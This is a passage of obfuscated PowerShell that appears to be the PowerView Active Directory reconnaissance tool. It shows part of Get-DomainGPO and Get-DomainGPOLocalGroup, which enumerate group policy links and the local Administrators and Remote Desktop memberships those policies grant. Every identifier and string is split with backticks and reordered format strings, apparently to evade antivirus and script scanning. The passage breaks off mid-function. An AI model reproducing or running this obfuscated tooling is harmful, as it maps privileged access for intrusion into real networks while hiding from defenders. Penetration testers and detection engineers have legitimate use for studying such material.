                ${SeAR`cH`Era`Rg`Ume`NTS}[("{1}{0}{2}" -f'oper','Pr','ties')] = ("{6}{3}{1}{5}{2}{0}{4}" -f 'hostn','sh',',dns','stingui','ame','edname','di')
                ${tArGET`COm`puT`ername} = ${N`UlL}

                if (${Ps`BOu`NdPA`RA`METe`Rs}[("{0}{1}{2}" -f 'Comput','er','Identity')]) {
                    ${SEARChE`RA`Rg`Umen`Ts}[("{1}{2}{0}" -f 'entity','I','d')] = ${COMpuT`e`R`iDEntI`Ty}
                    ${com`pU`T`Er} = &("{4}{0}{3}{1}{2}"-f't-Doma','nCom','puter','i','Ge') @SearcherArguments -FindOne | &("{1}{3}{0}{2}" -f 'bj','Se','ect','lect-O') -First 1
                    if(-not ${coMpu`T`Er}) {
                        &("{3}{2}{1}{0}" -f 'bose','e-Ver','t','Wri') ('['+'Get-'+'DomainGPO'+'] '+'Comput'+'er'+' '+"'$ComputerIdentity' "+'not'+' '+'found'+'!')
                    }
                    ${OBJe`CtDN} = ${CO`Mpu`TeR}."Dis`TIn`GUIsheD`N`A`Me"
                    ${TarGe`T`cOMpuTErN`A`Me} = ${cOm`pU`TeR}."dNSHOsT`N`AmE"
                }
                else {
                    ${Se`A`RcHERa`RgUm`ENts}[("{2}{0}{1}"-f't','ity','Iden')] = ${uSeR`iDENtI`Ty}
                    ${u`SEr} = &("{1}{2}{3}{0}"-f'r','Get-Dom','ainUs','e') @SearcherArguments -FindOne | &("{2}{1}{0}"-f't','ct-Objec','Sele') -First 1
                    if(-not ${Us`eR}) {
                        &("{3}{1}{0}{2}" -f'te-Verb','i','ose','Wr') ('[Get'+'-Domai'+'n'+'GPO] '+'U'+'ser '+"'$UserIdentity' "+'no'+'t '+'foun'+'d!')
                    }
                    ${ObJe`c`TdN} = ${us`Er}."dIsTi`Ng`UisHE`d`Na`me"
                }

                
                ${O`BJE`cTouS} = @()
                ${objE`cT`oUs} += ${O`B`JECTDN}.("{1}{0}"-f'it','spl').Invoke(',') | &("{3}{1}{0}{2}"-f'h','ac','-Object','ForE') {
                    if(${_}.("{0}{1}{2}" -f 'starts','w','ith').Invoke('OU=')) {
                        ${OBJ`EcT`dN}.("{2}{0}{3}{1}" -f'tr','g','SubS','in').Invoke(${oBjECt`DN}.("{0}{1}{2}"-f 'Ind','exO','f').Invoke("$($_),"))
                    }
                }
                &("{2}{0}{3}{1}" -f'-Verbo','e','Write','s') ('[Get-D'+'omainG'+'PO'+']'+' '+'obje'+'ct '+'O'+'Us: '+"$ObjectOUs")

                if (${o`BJec`Tous}) {
                    
                    ${SearCh`ER`A`RGumeNTS}.("{1}{0}" -f 'emove','R').Invoke(("{2}{3}{1}{0}" -f's','rtie','Prop','e'))
                    ${inh`e`Ri`TanCEdisA`BleD} = ${f`AlsE}
                    ForEach(${O`BJE`ctOu} in ${Ob`JE`CtoUs}) {
                        ${SEa`RcHeRar`gu`mENTs}[("{2}{1}{0}" -f 'ty','i','Ident')] = ${obj`E`CtOU}
                        ${gpO`ADsPat`hs} += &("{3}{0}{1}{2}"-f'e','t-Domain','OU','G') @SearcherArguments | &("{1}{0}{2}"-f 'ach-Obje','ForE','ct') {
                            
                            if (${_}."gp`LInK") {
                                ${_}."GP`LiNk"."S`plit"('][') | &("{3}{1}{0}{2}" -f 'ec','h-Obj','t','ForEac') {
                                    if (${_}.("{2}{0}{1}"-f 'tartswi','th','s').Invoke(("{1}{0}"-f 'DAP','L'))) {
                                        ${p`Arts} = ${_}.("{1}{0}" -f't','spli').Invoke(';')
                                        ${G`Po`DN} = ${p`A`RtS}[0]
                                        ${EN`F`orCed} = ${P`ArtS}[1]

                                        if (${iNher`iTAnce`d`IS`Ab`lEd}) {
                                            
                                            
                                            if (${ENf`Orc`ED} -eq 2) {
                                                ${G`P`odN}
                                            }
                                        }
                                        else {
                                            
                                            ${g`po`dN}
                                        }
                                    }
                                }
                            }

                            
                            if (${_}."G`p`oPtioNs" -eq 1) {
                                ${INHerI`Ta`Nce`DiSAbL`ED} = ${tR`UE}
                            }
                        }
                    }
                }

                if (${T`Arg`Etc`O`mPUTerNamE}) {
                    
                    ${coMPute`RsI`TE} = (&("{5}{3}{1}{6}{2}{4}{0}"-f'e','-NetCom','terSiteNa','t','m','Ge','pu') -ComputerName ${tARGetcOMPu`T`e`RNaME})."S`ite`NAME"
                    if(${Com`pU`Ter`s`ITE} -and (${coMpUt`e`RsitE} -notlike ("{1}{0}" -f 'ror*','Er'))) {
                        ${S`eArC`heR`Ar`GumeNtS}[("{0}{1}" -f 'Ide','ntity')] = ${CoM`P`UTe`RS`ITE}
                        ${gPOa`D`SPathS} += &("{0}{2}{1}{3}"-f 'Get-','om','D','ainSite') @SearcherArguments | &("{3}{1}{2}{0}" -f'bject','orEa','ch-O','F') {
                            if(${_}."Gpl`inK") {
                                
                                ${_}."g`pL`INk"."S`PLiT"('][') | &("{1}{3}{2}{0}"-f'h-Object','For','ac','E') {
                                    if (${_}.("{2}{0}{1}" -f 'a','rtswith','st').Invoke(("{1}{0}"-f'P','LDA'))) {
                                        ${_}.("{0}{1}" -f'spl','it').Invoke(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                
                ${OB`JectDOmAI`NDn} = ${o`BjEC`Tdn}.("{1}{2}{0}"-f'ng','SubStr','i').Invoke(${O`BJ`ECtDN}.("{2}{1}{0}"-f'Of','x','Inde').Invoke('DC='))
                ${SEA`RChe`RaRG`UmENTs}.("{0}{1}{2}"-f 'Rem','o','ve').Invoke(("{1}{0}"-f 'y','Identit'))
                ${S`ea`RC`HE`RA`RgUmEnTs}.("{0}{1}" -f'Remo','ve').Invoke(("{2}{0}{1}" -f'ro','perties','P'))
                ${s`EaRCh`er`ARgu`ME`NtS}[("{1}{0}{2}" -f 'Fil','LDAP','ter')] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
                ${GP`oad`SPAThS} += &("{0}{2}{4}{3}{1}" -f'Ge','ct','t-Do','nObje','mai') @SearcherArguments | &("{3}{2}{1}{0}" -f'ect','h-Obj','c','ForEa') {
                    if(${_}."gPl`iNK") {
                        
                        ${_}."gPL`I`NK"."Spl`it"('][') | &("{2}{1}{3}{0}"-f't','-','ForEach','Objec') {
                            if (${_}.("{2}{0}{1}" -f'tar','tswith','s').Invoke(("{1}{0}" -f 'AP','LD'))) {
                                ${_}.("{0}{1}"-f'spl','it').Invoke(';')[0]
                            }
                        }
                    }
                }
                &("{1}{2}{0}"-f'bose','Wri','te-Ver') ('[Get'+'-Dom'+'ainGPO]'+' '+'GP'+'OAdsPaths:'+' '+"$GPOAdsPaths")

                
                if (${OLD`PROpErtI`es}) { ${s`EARc`HErARGUMe`Nts}[("{2}{1}{0}" -f 's','tie','Proper')] = ${OL`DPrO`p`E`RtiES} }
                else { ${sEArCherA`RG`Um`eNTS}.("{2}{0}{1}" -f'v','e','Remo').Invoke(("{0}{3}{1}{2}" -f'P','o','perties','r')) }
                ${s`EaR`Che`RA`RGumENts}.("{0}{1}" -f 'Re','move').Invoke(("{1}{2}{0}"-f'tity','Id','en'))

                ${gPOaD`s`Paths} | &("{2}{1}{0}" -f 't','jec','Where-Ob') {${_} -and (${_} -ne '')} | &("{0}{2}{1}"-f'Fo','ect','rEach-Obj') {
                    
                    ${sE`AR`ch`Era`R`GUmentS}[("{0}{2}{1}" -f'Sear','e','chBas')] = ${_}
                    ${s`eaRcher`ARGuMeN`Ts}[("{2}{0}{1}"-f'ilt','er','LDAPF')] = ("{1}{5}{7}{3}{0}{8}{4}{6}{2}{9}" -f'u','(ob','taine','=gro','olicyCo','ject','n','Category','pP','r)')
                    &("{1}{0}{2}{3}" -f'DomainO','Get-','b','ject') @SearcherArguments | &("{1}{2}{0}{4}{3}"-f'-','F','orEach','t','Objec') {
                        if (${PsbOUNDp`Ar`A`mEtERS}['Raw']) {
                            ${_}."P`sOBJe`CT"."tyP`EnAM`ES".("{0}{1}"-f'Inse','rt').Invoke(0, ("{0}{2}{3}{1}"-f 'P','GPO.Raw','owerVi','ew.'))
                        }
                        else {
                            ${_}."p`Sob`jECT"."t`yPEnaM`Es".("{0}{1}"-f 'In','sert').Invoke(0, ("{1}{3}{0}{2}"-f'werView.GP','P','O','o'))
                        }
                        ${_}
                    }
                }
            }
            else {
                ${ID`eN`TITyFi`LtER} = ''
                ${fIl`TER} = ''
                ${id`Enti`TY} | &("{0}{1}{2}"-f'Wh','ere','-Object') {${_}} | &("{1}{0}{2}"-f'ec','ForEach-Obj','t') {
                    ${I`dEn`T`i`TYInstancE} = ${_}.("{2}{1}{0}" -f 'e','ac','Repl').Invoke('(', '\28').("{1}{0}" -f 'e','Replac').Invoke(')', '\29')
                    if (${IdE`Nt`I`TYinstaNCE} -match ((("{4}{5}{1}{0}{3}{2}"-f'/','/','wS^CN=.*','h','LDAP',':'))."rep`LACe"(([char]104+[char]119+[char]83),[StriNG][char]124))) {
                        ${IDE`NTiT`Yf`ILTER} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${P`Sb`OUN`D`PaRAmET`ErS}[("{0}{1}"-f 'Domai','n')]) -and (-not ${psB`OUNdp`ARAMETe`RS}[("{0}{1}{2}"-f'Search','Bas','e')])) {
                            
                            
                            ${IDENTI`Ty`D`Om`AiN} = ${iDEn`Tit`YinstA`N`Ce}.("{1}{0}{2}"-f'bS','Su','tring').Invoke(${i`de`Nt`ityInstA`NcE}.("{0}{2}{1}" -f 'In','f','dexO').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{1}{0}{2}" -f'erbos','Write-V','e') ('[Get-Domai'+'n'+'GPO]'+' '+'Ex'+'t'+'racted'+' '+'domain'+' '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                            ${Se`Ar`cHEr`ARGUmEN`TS}[("{1}{0}"-f'n','Domai')] = ${ID`en`TIT`Y`domAIn}
                            ${G`poS`eArCH`eR} = &("{0}{3}{2}{1}" -f'Get-Doma','Searcher','n','i') @SearcherArguments
                            if (-not ${G`PosEa`RCHeR}) {
                                &("{3}{1}{0}{2}" -f 't','ri','e-Warning','W') ('['+'Get-D'+'om'+'a'+'inGPO] '+'U'+'na'+'ble '+'t'+'o '+'re'+'trie'+'ve'+' '+'d'+'omai'+'n '+'searche'+'r'+' '+'fo'+'r '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif (${ideN`TiTY`iN`s`T`ANCe} -match '{.*}') {
                        ${idEnt`I`TyFIL`TeR} += "(name=$IdentityInstance)"
                    }
                    else {
                        try {
                            ${Gu`I`DbYteS`TRIng} = (-Join (([Guid]${i`dE`NT`itYiNStAN`cE}).("{0}{1}{2}"-f 'T','oByteArra','y').Invoke() | &("{2}{0}{1}" -f 'orE','ach-Object','F') {${_}.("{0}{2}{1}"-f 'ToStr','g','in').Invoke('X').("{2}{1}{0}" -f't','dLef','Pa').Invoke(2,'0')})) -Replace (("{1}{0}"-f'.)','(.')),'\$1'
                            ${iDE`N`TI`TYFI`LTEr} += "(objectguid=$GuidByteString)"
                        }
                        catch {
                            ${i`de`NTi`TyFi`ltER} += "(displayname=$IdentityInstance)"
                        }
                    }
                }
                if (${I`Dent`iTyF`ILTer} -and (${IDe`Ntit`Y`FILt`Er}.("{1}{0}" -f'im','Tr').Invoke() -ne '') ) {
                    ${filT`eR} += "(|$IdentityFilter)"
                }

                if (${PsBO`UndPa`R`AM`EtE`Rs}[("{0}{1}{2}{3}" -f 'LD','AP','Fi','lter')]) {
                    &("{0}{3}{1}{2}{4}" -f'Write-','e','rb','V','ose') ('[Get-Do'+'main'+'G'+'PO] '+'U'+'sing '+'addi'+'tio'+'na'+'l '+'LDA'+'P '+'fil'+'ter:'+' '+"$LDAPFilter")
                    ${fIlT`Er} += "$LDAPFilter"
                }

                ${G`P`OSeaR`ChEr}."fil`TEr" = "(&(objectCategory=groupPolicyContainer)$Filter)"
                &("{0}{3}{1}{2}"-f'Write-V','rb','ose','e') "[Get-DomainGPO] filter string: $($GPOSearcher.filter) "

                if (${pSBOuNdPa`R`A`M`EtERS}[("{0}{1}" -f 'FindOn','e')]) { ${REs`Ul`TS} = ${GP`O`sEARC`HEr}.("{2}{0}{1}"-f 'n','e','FindO').Invoke() }
                else { ${REs`U`LtS} = ${GP`osEa`Rch`ER}.("{0}{1}"-f 'Fi','ndAll').Invoke() }
                ${rESUL`Ts} | &("{2}{1}{0}"-f 'e-Object','er','Wh') {${_}} | &("{2}{0}{1}"-f'orEach-Objec','t','F') {
                    if (${pSBOu`NdParAm`e`TE`RS}['Raw']) {
                        
                        ${g`pO} = ${_}
                        ${g`Po}."PsO`Bj`eCT"."tYPENA`m`eS".("{0}{1}" -f 'Ins','ert').Invoke(0, ("{0}{2}{1}{3}" -f'Powe','Vi','r','ew.GPO.Raw'))
                    }
                    else {
                        if (${p`sBoUnD`ParamEtE`RS}[("{2}{0}{1}" -f 'earchB','ase','S')] -and (${Se`A`Rc`hBasE} -Match ("{1}{2}{0}"-f '//','^G','C:'))) {
                            ${G`pO} = &("{2}{3}{1}{4}{0}" -f'y','vert-LDAPProper','Co','n','t') -Properties ${_}."PROp`eR`TiES"
                            try {
                                ${gp`ODN} = ${g`PO}."DiS`TINGuI`SH`eDnAMe"
                                ${g`Pod`oMAIN} = ${gP`O`dn}.("{0}{2}{1}{3}"-f 'S','bStrin','u','g').Invoke(${gP`odn}.("{0}{1}" -f 'Index','Of').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                                ${GPC`FIlESY`s`PAtH} = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                                ${G`PO} | &("{2}{1}{0}{3}"-f'be','em','Add-M','r') ("{0}{1}{3}{2}" -f'N','ot','roperty','ep') ("{0}{2}{1}" -f 'gpcf','esyspath','il') ${gpc`F`i`LeS`ysPATh}
                            }
                            catch {
                                &("{3}{2}{0}{1}" -f 'rbo','se','e','Write-V') "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname) "
                            }
                        }
                        else {
                            ${g`PO} = &("{2}{1}{3}{0}" -f'ty','rt-LDAPProp','Conve','er') -Properties ${_}."p`ROPertI`ES"
                        }
                        ${g`PO}."psO`BJe`CT"."typE`N`AMes".("{2}{1}{0}"-f 'rt','se','In').Invoke(0, ("{0}{1}{4}{2}{3}"-f 'Po','w','e','w.GPO','erVi'))
                    }
                    ${g`po}
                }
                if (${Re`su`lts}) {
                    try { ${r`eSul`Ts}.("{0}{1}"-f'di','spose').Invoke() }
                    catch {
                        &("{2}{3}{1}{0}" -f'e','-Verbos','Wri','te') ('[Ge'+'t-Do'+'mai'+'nGPO] '+'E'+'rror '+'dispo'+'s'+'ing'+' '+'o'+'f '+'t'+'he '+'Resu'+'l'+'ts '+'o'+'bject: '+"$_")
                    }
                }
                ${GP`o`SeARcHer}.("{1}{0}{2}"-f'i','d','spose').Invoke()
            }
        }
    }
}


function G`e`T`-doMAInGPoLOcaL`g`RO`UP {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{3}{1}" -f'P','rocess','S','ShouldP'}, '')]
    [OutputType({"{1}{3}{0}{2}"-f'u','Pow','p','erView.GPOGro'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSITiOn = 0, VALueFrOmPIPELINE = ${T`RuE}, VALUEfrOMpIPELINEbyPRoPeRTyNAMe = ${Tr`UE})]
        [Alias({"{4}{2}{1}{0}{3}{5}"-f 'hed','nguis','sti','N','Di','ame'}, {"{2}{4}{3}{1}{0}"-f'Name','unt','S','mAcco','a'}, {"{0}{1}" -f'N','ame'})]
        [String[]]
        ${id`eN`TIty},

        [Switch]
        ${re`SolVeMem`BERST`o`SI`Ds},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DoMA`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'r','Filte'})]
        [String]
        ${ld`Apfi`LtER},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'ath','ADSP'})]
        [String]
        ${Se`ARchB`A`Se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{0}{2}{4}" -f'll','DomainContr','e','o','r'})]
        [String]
        ${S`ERvEr},

        [ValidateSet({"{1}{0}" -f'ase','B'}, {"{2}{0}{1}"-f 'e','vel','OneL'}, {"{1}{2}{0}" -f 'ree','Su','bt'})]
        [String]
        ${sear`CHSc`o`pE} = ("{0}{1}{2}"-f'Sub','t','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`SULT`Pa`geSIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seR`VErTi`M`eLIMit},

        [Switch]
        ${T`O`mbSTOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`E`dE`NtiAl} =   ( GeT-vArIABlE  21Gv7E  -Va  )::"em`PTY"
    )

    BEGIN {
        ${sEa`RcHeR`A`RgUM`En`TS} = @{}
        if (${psB`oUnD`p`ArAme`TERs}[("{0}{1}" -f 'D','omain')]) { ${sea`RCHEr`ARG`UmenTS}[("{0}{1}"-f'Dom','ain')] = ${d`oMaIn} }
        if (${psbOUNd`pAR`AMET`ERs}[("{2}{0}{1}"-f 'PFilte','r','LDA')]) { ${SeaRch`e`RaR`gUMen`TS}[("{1}{2}{0}"-f 'r','LDAP','Filte')] = ${d`OMA`In} }
        if (${PSBo`U`N`dPArameteRs}[("{1}{2}{0}"-f'se','Se','archBa')]) { ${SE`ARcHE`RA`R`GuM`enTs}[("{2}{0}{1}" -f'rc','hBase','Sea')] = ${SEarC`HBA`SE} }
        if (${PS`BOUn`DPAramet`Ers}[("{1}{2}{0}"-f'ver','Se','r')]) { ${s`eaRChERA`Rgu`me`N`Ts}[("{0}{1}"-f'Serv','er')] = ${s`eR`Ver} }
        if (${pSB`ound`p`A`Ra`MetERs}[("{0}{2}{1}{3}" -f 'SearchSc','p','o','e')]) { ${Se`A`RcHER`AR`gUMENTS}[("{1}{3}{2}{0}"-f 'Scope','Sea','ch','r')] = ${sear`CHsco`PE} }
        if (${P`sbOun`d`paRAME`T`ers}[("{0}{2}{3}{1}" -f'Re','e','sul','tPageSiz')]) { ${s`eaRcheR`Ar`GU`men`TS}[("{1}{0}{2}{3}"-f 'sul','Re','tPage','Size')] = ${REsuL`TPA`gE`s`iZE} }
        if (${PS`BO`UnDpa`R`AMe`Ters}[("{3}{2}{0}{1}"-f'verTimeLi','mit','er','S')]) { ${SearcHE`RARG`UME`Nts}[("{2}{1}{0}{3}" -f'rverTimeL','e','S','imit')] = ${SeRver`TimElI`M`IT} }
        if (${ps`B`OundP`AraME`TERS}[("{1}{0}" -f'stone','Tomb')]) { ${sEA`RCheRA`RGUMe`Nts}[("{1}{0}{2}" -f 'om','T','bstone')] = ${tOm`B`StOnE} }
        if (${PsBou`N`DPaRAmEt`ErS}[("{1}{0}{2}" -f 'edenti','Cr','al')]) { ${Se`A`RCheRarG`UM`ENtS}[("{2}{1}{0}"-f 'l','dentia','Cre')] = ${CrE`DEnti`Al} }

        ${COn`VE`R`TargUME`NTS} = @{}
        if (${p`sB`ounDPaR`AmEtE`RS}[("{0}{1}"-f 'Do','main')]) { ${co`NV`Er`TaR`gume`Nts}[("{2}{1}{0}"-f'n','i','Doma')] = ${D`oma`in} }
        if (${p`sbOUNDPAra`mET`e`Rs}[("{1}{0}" -f'ver','Ser')]) { ${COnve`R`Ta`Rg`UmenTS}[("{1}{0}"-f'rver','Se')] = ${S`ErV`er} }
        if (${p`S`BOUnDPAram`e`TE`Rs}[("{2}{1}{0}"-f'ential','ed','Cr')]) { ${co`NVERTAr`gu`MENts}[("{2}{3}{0}{1}" -f 'ia','l','Creden','t')] = ${C`R`e`DENTial} }

        ${s`PL`IToP`TION} =   ( GEt-VariAble i06 -va)::"remov`eEM`PT`YE`NTRi`ES"
    }

    PROCESS {
        if (${P`s`B`OUNdparaMET`eRs}[("{2}{0}{1}" -f'n','tity','Ide')]) { ${se`AR`Ch`eRa`Rg`UmenTs}[("{2}{0}{1}"-f'i','ty','Ident')] = ${I`Den`Tity} }

        &("{0}{1}{2}"-f'G','et-DomainG','PO') @SearcherArguments | &("{0}{3}{1}{4}{2}" -f'Fo','ach-O','ject','rE','b') {
            ${GpoDiS`p`LAYna`Me} = ${_}."dIS`PL`AY`NaMe"
            ${GPO`NA`Me} = ${_}."na`me"
            ${G`pOp`Ath} = ${_}."g`PC`FiLeSySPA`TH"

            ${pa`RSEAr`gS} =  @{ ("{2}{0}{1}" -f 'mplPat','h','GptT') = ("$GPOPath\MACHINE\Microsoft\Windows "+('NT2dfSe'+'cEd'+'it'+'2dfGp'+'tT'+'m'+'pl.'+'i'+'nf').("{0}{1}{2}"-f'r','e','PLACe').Invoke('2df','\')) }
            if (${psb`ouND`paRAM`Eters}[("{0}{2}{1}" -f'Crede','al','nti')]) { ${pARSE`Ar`GS}[("{0}{2}{1}" -f 'Crede','l','ntia')] = ${cREDe`Nti`Al} }

            
            ${i`NF} = &("{2}{0}{1}" -f 't-GptTm','pl','Ge') @ParseArgs

            if (${i`NF} -and (${i`NF}."P`sba`se"."K`EyS" -contains ("{4}{1}{3}{0}{2}" -f 'embershi','ro','p','up M','G'))) {
                ${m`e`mberS`HIPs} = @{}

                
                ForEach (${MEM`B`ershiP} in ${I`NF}.'Group Membership'.("{2}{1}{0}" -f'or','erat','GetEnum').Invoke()) {
                    ${Gr`o`UP}, ${r`eLaTI`oN} = ${MEmBe`RS`HiP}."K`ey".("{1}{0}"-f 'it','Spl').Invoke('__', ${s`Plitopt`Ion}) | &("{3}{0}{1}{2}"-f'Obje','c','t','ForEach-') {${_}.("{1}{0}" -f 'rim','T').Invoke()}
                    
                    ${m`EMBe`RShipvA`LuE} = ${MEMB`eRSh`iP}."va`LuE" | &("{0}{2}{3}{1}"-f'W','Object','here','-') {${_}} | &("{2}{1}{0}{3}" -f'bjec','O','ForEach-','t') { ${_}.("{1}{0}"-f'im','Tr').Invoke('*') } | &("{0}{1}{2}" -f 'W','here','-Object') {${_}}

                    if (${psBOUnD`paRAm`E`TErs}[("{3}{4}{0}{1}{2}" -f 'e','Mem','bersToSIDs','Resol','v')]) {
                        
                        ${gR`ou`p`mEmBErs} = @()
                        ForEach (${M`Em`Ber} in ${Mem`BE`Rs`hIpVA`l`Ue}) {
                            if (${m`em`BER} -and (${M`EM`BER}.("{1}{0}" -f'im','Tr').Invoke() -ne '')) {
                                if (${MEM`Ber} -notmatch ("{0}{1}{2}"-f'^','S-1-.','*')) {
                                    ${Co`Nv`erTToARG`UMEn`Ts} = @{("{2}{1}{0}" -f'Name','t','Objec') = ${meMb`Er}}
                                    if (${PSBO`UnDPA`RaM`Eters}[("{0}{1}" -f 'Do','main')]) { ${cOn`VeRt`To`Ar`GUMEnts}[("{1}{0}"-f 'omain','D')] = ${dOm`A`In} }
                                    ${me`MBe`RsID} = &("{2}{0}{1}"-f 'ertTo-S','ID','Conv') @ConvertToArguments

                                    if (${me`mBEr`sID}) {
                                        ${Gro`UPME`mB`Ers} += ${M`eM`B`ErsiD}
                                    }
                                    else {
                                        ${gR`OUpm`eM`BE`Rs} += ${Me`Mb`er}
                                    }
                                }
                                else {
                                    ${G`Rou`pMEmb`E`Rs} += ${mE`mBer}
                                }
                            }
                        }
                        ${M`Emb`eRsHIp`ValUe} = ${gRouP`MEMbE`Rs}
                    }

                    if (-not ${Mem`B`ErShIpS}[${g`R`OuP}]) {
                        ${mEMbErsH`i`pS}[${gR`o`UP}] = @{}
                    }
                    if (${meM`B`ERShi`pVa`LUE} -isnot [System.Array]) {${MembE`R`s`HiPVAlUE} = @(${MeMB`ERshiP`V`A`lUE})}
                    ${MemB`Ersh`iPS}[${GrO`UP}].("{0}{1}" -f 'A','dd').Invoke(${rel`ATiON}, ${memb`ERsH`I`PVaLuE})
                }

                ForEach (${mEMBe`R`sH`Ip} in ${membeRs`H`ips}.("{3}{1}{2}{0}"-f 'r','n','umerato','GetE').Invoke()) {
                    if (${me`mBErsH`IP} -and ${mE`MbErs`HIp}."K`eY" -and (${mem`BERSH`ip}."K`eY" -match '^\*')) {
                        
                        ${gro`U`Ps`iD} = ${Mem`Be`Rs`hip}."K`Ey".("{0}{1}" -f'Tri','m').Invoke('*')
                        if (${grouPS`ID} -and (${gRO`UP`sid}.("{0}{1}" -f'Tri','m').Invoke() -ne '')) {
                            ${gRO`Up`NaME} = &("{0}{1}{3}{2}"-f'Conv','ert','D','From-SI') -ObjectSID ${GroUP`s`id} @ConvertArguments
                        }
                        else {
                            ${g`Roup`N`AmE} = ${F`Alse}
                        }
                    }
                    else {
                        ${G`RoUpna`ME} = ${ME`mBER`sHip}."K`EY"

                        if (${GrOu`pn`Ame} -and (${G`RoU`PnaMe}.("{1}{0}"-f 'm','Tri').Invoke() -ne '')) {
                            if (${gRo`Upna`Me} -match ("{0}{4}{3}{2}{1}" -f 'A','s','nistrator','mi','d')) {
                                ${g`ROupSId} = ("{2}{1}{3}{0}" -f '44','-5','S-1','-32-5')
                            }
                            elseif (${GRoU`p`NaME} -match ("{3}{2}{1}{0}" -f 'op','t','ote Desk','Rem')) {
                                ${gR`oUp`Sid} = ("{0}{1}{2}" -f'S-1','-5-3','2-555')
                            }
                            elseif (${GRo`UPN`A`me} -match ("{1}{0}" -f 'uests','G')) {
                                ${gR`oUpSid} = ("{0}{2}{1}{3}" -f'S-1-5','-','-32','546')
                            }
                            elseif (${Gr`oUpN`Ame}.("{0}{1}"-f'Tr','im').Invoke() -ne '') {
                                ${ConVe`RtT`O`ARg`UmEnTs} = @{("{2}{0}{1}" -f 'bjectNa','me','O') = ${G`R`OUPnAME}}
                                if (${P`S`BOUN`dp`AraMEt`ERS}[("{0}{1}" -f 'D','omain')]) { ${coNvER`TToA`R`gU`M`E`NtS}[("{1}{0}" -f'omain','D')] = ${DOma`iN} }
                                ${g`Rou`pSiD} = &("{0}{2}{1}{3}" -f'Con','ertTo-SI','v','D') @ConvertToArguments
                            }
                            else {
                                ${G`R`OuPSiD} = ${Nu`Ll}
                            }
                        }
                    }

                    ${G`po`grouP} = &("{3}{1}{0}{2}"-f 'c','e','t','New-Obj') ("{0}{1}"-f 'PSOb','ject')
                    ${G`PogR`oUP} | &("{0}{2}{1}"-f 'A','ber','dd-Mem') ("{2}{3}{1}{0}"-f 'roperty','tep','N','o') ("{2}{0}{1}{3}" -f 'D','is','GPO','playName') ${G`PO`Di`SpLa`yNAmE}
                    ${gpoG`R`OUp} | &("{0}{1}{3}{2}" -f 'Add','-Memb','r','e') ("{2}{3}{1}{0}"-f 'rty','teprope','N','o') ("{0}{2}{1}"-f'GPO','ame','N') ${g`PoNa`me}
                    ${gpOG`R`oUp} | &("{3}{2}{0}{1}" -f 'M','ember','dd-','A') ("{3}{2}{1}{0}"-f'roperty','ep','ot','N') ("{0}{1}"-f 'G','POPath') ${GpOPA`Th}
                    ${g`P`OgROup} | &("{0}{1}{2}" -f 'Add','-Memb','er') ("{0}{1}{2}" -f 'Notepro','p','erty') ("{0}{1}" -f'GPOT','ype') ("{4}{0}{2}{1}{3}"-f'ri','dGro','cte','ups','Rest')
                    ${gp`o`GRoUp} | &("{1}{2}{0}"-f'Member','A','dd-') ("{0}{2}{1}"-f'Notepro','y','pert') ("{2}{0}{1}" -f 'lt','ers','Fi') ${n`ULL}
                    ${GP`ogro`UP} | &("{3}{1}{0}{2}"-f'e','Memb','r','Add-') ("{1}{2}{0}{3}" -f 'pr','N','ote','operty') ("{1}{2}{0}" -f 'e','G','roupNam') ${GrOUp`NA`Me}
                    ${gpo`g`R`OuP} | &("{0}{1}{2}"-f 'Add','-Mem','ber') ("{1}{0}{2}" -f 'roper','Notep','ty') ("{1}{0}" -f 'ID','GroupS') ${groU`p`SId}
                    ${gP`o`GroUp} | &("{2}{0}{3}{1}"-f 'dd-Me','ber','A','m') ("{1}{3}{0}{2}"-f 'roper','Note','ty','p') ("{2}{1}{4}{3}{0}"-f 'rOf','rou','G','embe','pM') ${ME`mBER`SHip}."VA`lUE"."mEMBe`ROF"
                    ${gpo`gr`oUp} | &("{1}{2}{0}" -f 'mber','Add','-Me') ("{2}{1}{0}"-f 'property','te','No') ("{0}{2}{1}{3}"-f 'GroupM','mbe','e','rs') ${M`EMB`eRShIP}."vAL`Ue"."M`EMb`Ers"
                    ${G`pO`gR`OUp}."p`SoB`jecT"."tYpen`AmES".("{1}{0}"-f'rt','Inse').Invoke(0, ("{0}{2}{4}{5}{3}{1}"-f'P','oup','ower','POGr','Vi','ew.G'))
                    ${GpoG`R`OUP}
                }
            }

            
            ${PAR`sEa`Rgs} =  @{
                ("{3}{0}{2}{1}" -f 'u','path','psXML','Gro') = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            }

            &("{3}{0}{2}{1}" -f 'p','ML','sX','Get-Grou') @ParseArgs | &("{3}{1}{2}{0}" -f 'ect','E','ach-Obj','For') {
                if (${pS`BoU`NdPAr`AmET`Ers}[("{1}{4}{3}{0}{2}"-f 'oSID','Res','s','bersT','olveMem')]) {
                    ${G`ROUpMeMb`E`RS} = @()
                    ForEach (${Mem`Ber} in ${_}."GRO`U`PMEmBeRs") {
                        if (${M`emBER} -and (${me`MbeR}.("{1}{0}"-f'rim','T').Invoke() -ne '')) {
                            if (${mEmb`Er} -notmatch ("{0}{1}{2}"-f'^S','-1-.','*')) {

                                
                                ${coNVE`R`TtOar`gUMen`Ts} = @{("{2}{1}{0}" -f'ame','ctN','Obje') = ${g`ROu`Pna`mE}}
                                if (${pSbO`U`NDp`ARameteRS}[("{1}{0}" -f'ain','Dom')]) { ${cO`N`VerTTOaRg`UmEn`TS}[("{1}{2}{0}" -f 'ain','D','om')] = ${d`om`AiN} }
